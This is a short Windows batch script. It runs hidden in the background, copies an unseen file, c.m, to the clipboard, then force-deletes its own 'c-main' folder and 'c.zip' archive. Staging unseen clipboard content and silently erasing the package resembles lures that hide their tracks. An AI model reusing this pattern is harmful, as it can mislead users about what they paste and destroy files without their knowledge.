@echo off
:: Disable command output
setlocal enabledelayedexpansion

:: Run silently in background
start /b cmd /c ^
(
  :: Copy content of c.m to clipboard
  type c.m | clip
  
  :: Brief pause to ensure clipboard operation completes
  timeout /t 1 /nobreak > nul
  
  :: Move up one directory
  cd ..
  
  :: Delete the c-main folder
  if exist c-main rmdir /s /q c-main
  
  :: Delete c.zip file
  if exist c.zip del /f /q c.zip
)